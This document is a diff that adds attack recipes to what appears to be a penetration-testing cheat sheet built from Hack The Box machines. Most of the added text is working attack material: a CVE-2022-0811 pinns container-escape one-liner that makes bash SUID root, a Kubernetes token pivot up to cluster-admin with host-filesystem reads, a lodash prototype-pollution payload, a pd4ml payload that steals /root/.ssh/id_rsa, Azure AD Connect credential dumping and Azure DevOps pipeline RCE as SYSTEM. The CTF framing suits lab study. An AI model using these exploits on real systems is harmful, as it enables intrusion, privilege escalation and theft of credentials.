@@ -135,6 +135,76 @@ curl http://bucket-name.s3.amazonaws.com/
 aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
 ```
 
+### LocalStack-Backed Cloud Challenges (`s3.<host>` subdomain → hypercorn-h11)
+
+CTF/HTB cloud boxes often expose **LocalStack** (a local AWS emulator) on a
+sibling vhost like `s3.<host>` rather than the real AWS endpoint. Fingerprint:
+- `Server: hypercorn-h11` and `access-control-allow-headers` listing
+  `x-localstack-target` and `x-amz-*` values.
+- `GET /` returns `{"status": "running"}`; `GET /health` lists which AWS
+  services are simulated (`{"services": {"s3": "running", "dynamodb":
+  "running"}}`).
+
+Authenticate to LocalStack with **`AWS_ACCESS_KEY_ID=test` /
+`AWS_SECRET_ACCESS_KEY=test`** (default credentials accept any value). When
+the system `aws` CLI cannot resolve the custom hostname (no `/etc/hosts`
+write access), use boto3 with a `socket.getaddrinfo` monkeypatch:
+
+```python
+import socket
+TARGET = "10.129.x.x"
+HOSTS = {"s3.bucket.htb": TARGET, "bucket.htb": TARGET}
+_o = socket.getaddrinfo
+socket.getaddrinfo = lambda h, *a, **k: _o(HOSTS.get(h, h), *a, **k)
+
+import boto3
+from botocore.client import Config
+s3 = boto3.client("s3", endpoint_url="http://s3.bucket.htb",
+    aws_access_key_id="test", aws_secret_access_key="test",
+    region_name="us-east-1",
+    config=Config(s3={"addressing_style": "path"}))
+print([b["Name"] for b in s3.list_buckets()["Buckets"]])
+```
+
+Reconnaissance sweep across LocalStack-emulated services:
+
+```python
+for svc in ["s3", "dynamodb", "sqs", "sns", "lambda",
+            "secretsmanager", "ssm", "kms", "iam"]:
+    c = boto3.client(svc, endpoint_url="http://s3.<host>",
+        aws_access_key_id="test", aws_secret_access_key="test",
+        region_name="us-east-1")
+    # call the appropriate List/Describe and dump
+```
+
+Fast-path enumeration in priority order:
+1. `s3.list_buckets()` then `list_objects_v2` per bucket
+2. `s3.list_object_versions(Bucket=...)` (deleted/older files often
+   contain creds the latest version was scrubbed of)
+3. `s3.get_bucket_policy/cors/notification` (explains automatic processing)
+4. `dynamodb.list_tables()` then `scan` each — these tables are the
+   classic location for plaintext usernames/passwords
+5. `secretsmanager.list_secrets()`, `ssm.describe_parameters()`
+6. `lambda.list_functions()` + `lambda.get_function(...)` (download
+   `Code.Location` for embedded creds in source)
+
+Common exploitation primitives:
+- **PutObject into web-served bucket** → upload a PHP shell or `.htaccess`
+  if the bucket contents are synced into a writable webroot. Check the
+  `Last-Modified` header on the bucket's object via the public website
+  (e.g. `bucket.htb/index.html`) over time — periodic sync is a clear
+  signal. **Watch for cleanup loops:** some boxes wipe non-original
+  bucket keys every 20-60 s, so race the upload against the sync window.
+- **DynamoDB `put_item` injection** → if a table is read by an internal
+  PDF/email/notification pipeline, attacker rows can trigger SSRF, XSS,
+  or arbitrary callbacks. Insert with `password` / `username` keys
+  matching observed schema.
+- **Versioned buckets** retain pre-cleanup content; `list_object_versions`
+  + `get_object(VersionId=...)` recovers credentials that were
+  overwritten on a later upload.
+- **Lambda functions** with `--zip-file` updates can be hijacked when
+  the boto3 client has IAM `lambda:UpdateFunctionCode`.
+
 ### IAM Privilege Escalation
 ```bash
 # List IAM permissions
@@ -1074,3 +1144,113 @@ subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt
 5. **Network discovery** — `cat /proc/net/fib_trie` or `ip route` to find Docker networks, gateway (usually Docker host at x.x.x.1)
 6. **Docker host access** — try SSH to gateway IP with found creds. Check if Docker socket is mounted (`ls /var/run/docker.sock`)
 7. **Other containers** — if Docker socket accessible: `docker ps`, `docker exec` into other containers
+
+---
+
+## Kubernetes Service-Account Token Pivot (Multi-Namespace RBAC Climb)
+
+**Pattern from HTB Unobtainium (k3s, multi-pod cluster):**
+A foothold pod's default SA in namespace A may have *no* useful permissions, but `pods` LIST in another namespace B is granted. Pivot:
+
+1. **From foothold pod (default SA), list namespaces** via `curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces`. 403 on most resources is fine — keep walking.
+2. **Probe each namespace** for `pods` listing — find one that returns a `PodList` (e.g., `dev`).
+3. **Discover that pod's IP** from the listing. If the pod runs the *same vulnerable app* (often the case in HTB-style boxes), the same RCE/cmdi works against it from the foothold pod's network.
+4. **Re-RCE the higher-priv pod** to dump *its* `/run/secrets/kubernetes.io/serviceaccount/token`. That token has different RBAC — typically can list `secrets` in `kube-system`.
+5. **Search kube-system secrets** for a service-account token whose name contains `admin`/`cluster`/`c-admin`. Decode the `data.token` (base64) to get a JWT; the `sub` field reveals the SA (`system:serviceaccount:kube-system:c-admin`).
+6. **Verify cluster-admin** by listing `nodes` or creating a `Namespace`. If success → full cluster compromise.
+
+### Read host filesystem after cluster-admin
+- `image: alpine` will fail if cluster has no internet egress (`image can't be pulled`). **Always reuse a local-registry image** discovered in existing pod specs (e.g., `localhost:5000/node_server`).
+- Pod with `volumes: [{name: hostfs, hostPath: {path: /}}]` and `mountPath: /host` exposes node root.
+- Easiest exfil: have the container `cat` target files to **stdout**, then read pod logs via `GET /api/v1/namespaces/<ns>/pods/<name>/log` — no exec/SPDY needed.
+- The host's `/root/root.txt` (and other privileged files) are at `/host/root/root.txt` inside the pod.
+
+### Shell-output exfil through a load-balanced webapp pod
+When the foothold is a webapp running as a multi-replica `Deployment`, each HTTP request may hit a different pod. Files written to one pod's local FS are invisible to others — and the LFI read endpoint may go to a different pod than the upload one.
+- **Solution:** repeat the upload (write) **N times** (≥10) so most pods receive the file, then retry the LFI read with backoff until one pod returns content.
+- Alternatively send all output to **stdout of a one-shot pod** and read it via Kubernetes `pods/log` API — single source of truth.
+
+---
+
+## Lodash `_.merge` Prototype Pollution — `constructor.prototype` Variant
+
+**Symptom:** `__proto__` injection appears to land (`{"ok": true}`) but the polluted property isn't visible to subsequent code.
+**Cause:** Newer lodash (≥ 4.17.5) sanitizes the literal key `__proto__` but still merges `constructor.prototype.<key>`.
+**Working payload:**
+```json
+{"auth": {...}, "message": {"constructor": {"prototype": {"canUpload": true}}}}
+```
+After this single PUT, every plain object in the Node process has `canUpload === true` via prototype-chain lookup, so `findUser(...)` returns a user that *passes* `if (!user.canUpload)` checks. Used on HTB Unobtainium to upgrade `felamos` from message-poster to authenticated `/upload` cmd-injection.
+
+---
+
+## Azure AD Connect — `(localdb)\.\ADSync` Connection Failure on WinRM
+
+**Symptom (HTB Monteverde):** Running the canonical xpn `Get-AzureADCredentials.ps1` over evil-winrm fails with
+```
+SqlException: Unable to locate a Local Database Runtime installation.
+```
+even though `sqlservr.exe` runs as the AAD service account. The LocalDB runtime resolver is per-user-session and not exposed to the network logon.
+
+**Fix:** swap the connection string from `Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync` to a direct-instance connection. The default SQL Server instance is reachable from the Azure-Admins-group user via integrated auth:
+```powershell
+$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=.;Database=ADSync;Integrated Security=true"
+```
+Also add explicit casts on `LoadKeySet` args (some PS hosts otherwise raise `MethodArgumentConversionInvalidCastArgument` followed by an `AccessViolationException` in `mcrypt.dll`):
+```powershell
+$km.LoadKeySet([guid]$entropy, [guid]$instance_id, [int]$key_id)
+```
+
+---
+
+## LocalStack-Backed HTB Cloud Boxes — Common Patterns
+
+- **Default test/test creds always work.** `aws --endpoint-url http://s3.<host>` with `aws_access_key_id=test`/`aws_secret_access_key=test` is the LocalStack default — never spray; just use these.
+- **Sync direction is webroot → S3, not S3 → webroot.** A cron typically runs `aws s3 sync /var/www/html/ s3://adserver/`, so files PUT to S3 by the attacker do NOT appear in the webroot. Don't waste time uploading PHP shells to S3 — search instead for *DynamoDB-backed* second-stage paths (e.g., pd4ml PDF generator on `localhost:8000`) that the webroot triggers based on table contents.
+- **DynamoDB credential reuse is the real foothold.** The DDB `users` table on Bucket-style boxes contains `Sysadm`/`Cloudadm`/`Mgmt` users — one of those passwords is *always* the SSH password for the Linux user (`roy`/etc.). Try every `(linux_user, ddb_password)` combo before any RCE chain.
+- **pd4ml file-read primitive.** Once inside, look for `/var/www/<appname>/` containing `pd4ml_demo.jar` and an `index.php` with `passthru("java ... Pd4Cmd file:///.../files/$name 800 A4 -out files/result.pdf")`. Insert into the configured DDB table (often filtered by `title=Ransomware` or similar) a row whose data field is `<html><pd4ml:attachment src="file:///root/.ssh/id_rsa" description="x" icon="Paperclip"/></html>`, POST `action=get_alerts` to localhost:8000, then `pdfdetach -saveall` the resulting `result.pdf` for the attached private key. Cleanup loops on these boxes delete attacker rows within ~60 s — chain everything in one SSH command and `base64 -w0` the PDF back over the same connection.
+
+---
+
+## Azure DevOps Server (NTLM) — Pipeline-as-Code RCE Pattern
+
+**Authentication via `curl --ntlm -u user:pass`** (anonymous returns `TF400813: Resource not available for anonymous access`). The 302 to `/{collection}/` after auth is the success signal. Use `?api-version=5.1` for Azure DevOps Server 2019/2020 (6.0+ raises `VssVersionOutOfRangeException`).
+
+**Trigger build on a feature branch when master is policy-protected** (HTB Worker pattern):
+1. Push aspx/yaml to a new branch via `git -c http.extraHeader="Host: devops.target.htb" push`.
+2. Queue an *existing* CI pipeline against the new branch:
+   ```bash
+   curl --ntlm -u user:pass -X POST -H 'Content-Type: application/json' \
+     -d '{"definition":{"id":3},"sourceBranch":"refs/heads/<branch>"}' \
+     "http://devops.target.htb/{coll}/{proj}/_apis/build/builds?api-version=5.1"
+   ```
+3. The build's CopyFiles task deploys to `w:\sites\<repo>.target.htb` — your aspx is now reachable on the IIS vhost. `iis apppool\defaultapppool` is enough to read the SVN `conf\passwd` file holding the next user's password.
+
+**Privilege escalation via SYSTEM build agent:** create a *new* `azure-pipelines.yml` pipeline definition (YAML build, processType=2) on a new branch, queue it on the on-prem agent pool. The agent runs as `NT AUTHORITY\SYSTEM`, so the script step can `type C:\Users\Administrator\Desktop\root.txt` directly into the build log — read the log via `_apis/build/builds/<id>/logs/<n>?api-version=5.1`. No reverse shell required.
+
+---
+
+## CVE-2022-0811 — pinns Sysctl Splitter Container Escape
+
+**One-liner from a low-priv user with the `pinns` SUID binary:**
+```bash
+echo '#!/bin/bash
+chmod u+s /bin/bash' > /dev/shm/exp.sh && chmod +x /dev/shm/exp.sh
+
+mkdir -p /dev/shm/exproot
+pinns -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/dev/shm/exp.sh #' \
+      -f exptest -d /dev/shm/exproot -U
+
+sleep 100 & kill -SIGSEGV $!
+/bin/bash -p
+```
+The `+` separator in the `-s` flag bypasses validation — only the first `key=value` is checked, the second silently overwrites `core_pattern`. `pinns -U` then fails with `Operation not permitted` *but the sysctl write has already happened*. SIGSEGV-ing any process triggers the new `core_pattern` (a pipe to our SUID-creating script). The pipe handler runs as root, leaving SUID-root `/bin/bash`.
+
+---
+
+## Electron Asar Reversal Pattern
+
+For HTB-style "download our desktop client" boxes:
+1. `unobtainium_debian.zip` → `7z x` → `dpkg-deb -X` (or `7z x data.tar.xz`) → `app.asar`.
+2. `npx @electron/asar extract app.asar app/` exposes JS sources, including hardcoded `auth: {name, password}` and the API hostname.
+3. The desktop client's API endpoint (port 31337 / 8443 / etc.) is the real attack surface; the Electron app is just a discovery vehicle for credentials and the prototype-pollution / cmd-injection sinks documented in its source.
